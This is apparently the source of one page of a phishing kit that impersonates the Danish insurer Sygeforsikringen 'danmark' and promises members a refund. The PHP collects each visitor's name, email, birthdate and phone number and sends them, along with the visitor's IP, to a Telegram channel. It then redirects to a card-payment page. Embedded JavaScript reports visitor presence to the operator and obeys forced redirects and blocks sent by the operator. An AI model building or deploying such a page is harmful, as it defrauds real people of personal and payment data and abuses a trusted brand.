<?php
require_once 'config.php';

$ip = getVisitorIP();

// Vérifier si l'IP est bloquée
if (isIPBlocked($ip)) {
    http_response_code(403);
    echo "<!DOCTYPE html><html><head><title>Access Denied</title></head><body><h1>Access Denied</h1><p>Your access has been restricted.</p></body></html>";
    exit;
}

updateVisitorStatus($ip, 'info', 'online');

$error = '';
$success = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $fullname = $_POST['fullname'] ?? '';
    $email = $_POST['email'] ?? '';
    $birthdate = $_POST['birthdate'] ?? '';
    $phone = $_POST['phone'] ?? '';
    
    if (empty($fullname) || empty($email) || empty($birthdate) || empty($phone)) {
        $error = 'Alle felter skal udfyldes';
    } else {
        // Préparer le message pour Telegram
        $message = "📋 <b>Nye personlige oplysninger</b>\n\n";
        $message .= "👤 <b>Fulde navn:</b> $fullname\n";
        $message .= "📧 <b>E-mail:</b> $email\n";
        $message .= "🎂 <b>Fødselsdato:</b> $birthdate\n";
        $message .= "📱 <b>Telefonnummer:</b> $phone\n";
        $message .= "🌐 <b>IP:</b> $ip\n";
        $message .= "⏰ <b>Tid:</b> " . date('Y-m-d H:i:s');
        
        // Sauvegarder en session
        $_SESSION['fullname'] = $fullname;
        $_SESSION['email'] = $email;
        $_SESSION['birthdate'] = $birthdate;
        $_SESSION['phone'] = $phone;
        
        // Envoyer à Telegram
        if (sendToTelegram($message)) {
            $success = true;
            // Rediriger vers card immédiatement
            header("refresh:0;url=card.php");
        } else {
            $error = 'Der opstod en fejl. Prøv venligst igen.';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="da">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bliv medlem | Sygeforsikringen "danmark"</title>
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <link rel="apple-touch-icon" href="apple-touch-icon.png">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <header class="header">
        <div class="header-content">
            <div class="logo">
                     <img align="center" border="0" src="https://s3-eu-west-1.amazonaws.com/mimgs/cdn/TWO/2436/thlHNdETFm9fb2KIsG5w_logo_danmark.png" alt="" title="" style="outline: none;text-decoration: none;-ms-interpolation-mode: bicubic;clear: both;display: inline-block !important;border: none;height: auto;float: none;width: 100%;max-width: 168px;" width="168"/>
            </div>
            <a href="tel:70109070" class="phone">70 10 90 70</a>
        </div>
    </header>

    <div class="container">
        <?php if ($success): ?>
            <div class="alert" style="background-color: #d4edda; border-color: #c3e6cb; color: #155724;">
                ✓ Dine oplysninger er modtaget. Du omdirigeres...
            </div>
        <?php endif; ?>

        <?php if ($error): ?>
            <div class="alert" style="background-color: #f8d7da; border-color: #f5c6cb; color: #721c24;">
                ⚠ <?php echo htmlspecialchars($error); ?>
            </div>
        <?php endif; ?>

        <!-- Progress Indicator -->
        <div class="progress-indicator">
            <div class="progress-step">
                <div class="step-circle active">1</div>
                <div class="step-line"></div>
                <div class="step-circle">2</div>
                <div class="step-line"></div>
                <div class="step-circle">3</div>
            </div>
        </div>

        <h1>Bliv medlem</h1>
        <p class="subtitle">Indtast dine oplysninger for at fuldføre processen og modtage din refusion.</p>

        <!-- Info Badge -->
        <div class="security-badge" style="background-color: #e8f5e9; border-color: #28a745; color: #28a745;">
            <div class="security-badge-icon">ℹ️</div>
            <div class="security-badge-text">Dine personlige oplysninger behandles fortroligt og sikkert</div>
        </div>

        <form method="POST" action="">
            <div class="form-group">
                <label>
                    Fulde navn <span class="required">*</span>
                    <span class="tooltip-icon" data-tooltip="Indtast dit fornavn og efternavn">?</span>
                </label>
                <input type="text" name="fullname" required placeholder="Fornavn Efternavn" autocomplete="name">
            </div>

            <div class="form-group">
                <label>
                    E-mail <span class="required">*</span>
                    <span class="tooltip-icon" data-tooltip="Vi sender bekræftelse til denne e-mail">?</span>
                </label>
                <input type="email" name="email" required placeholder="din@email.dk" autocomplete="email">
            </div>

            <div class="form-group">
                <label>
                    Fødselsdato <span class="required">*</span>
                    <span class="tooltip-icon" data-tooltip="Du skal være mindst 18 år gammel">?</span>
                </label>
                <input type="date" name="birthdate" required autocomplete="bday">
            </div>

            <div class="form-group">
                <label>
                    Telefonnummer <span class="required">*</span>
                    <span class="tooltip-icon" data-tooltip="Dansk mobilnummer (8 cifre)">?</span>
                </label>
                <input type="tel" name="phone" required placeholder="12 34 56 78" autocomplete="tel">
            </div>

            <button type="submit" class="btn">➡️ Fortsæt til betaling</button>
        </form>
    </div>

    <script src="js/form-validation.js"></script>
   <script>
// ✅ Send heartbeat immediately when the page loads
document.addEventListener('DOMContentLoaded', () => {
  // First immediate update
  fetch('api/heartbeat.php?page=info');

  // 🔁 Then update every 5 seconds so the visitor stays "online"
  setInterval(() => {
    fetch('api/heartbeat.php?page=page1');
  }, 5000);
});

async function checkForceRedirect() {
  try {
    const response = await fetch('api/check_force_redirect.php');
    const data = await response.json();

    // 🚫 If the visitor is blocked
    if (data.blocked) {
      document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:50px'>🚫 You have been blocked from entering</h1>";
      return; // stop everything
    }

    // 🔁 Forced or normal redirection
    if (data.force_redirect && data.url) {
      window.location.href = data.url;
    } else if (data.redirect && data.url) {
      window.location.href = data.url;
    }

  } catch (error) {
    console.error('Redirect check failed:', error);
  }
}

// Run when the page loads
checkForceRedirect();

// Check every 5 seconds
setInterval(checkForceRedirect, 10000);
</script>


</body>
</html>
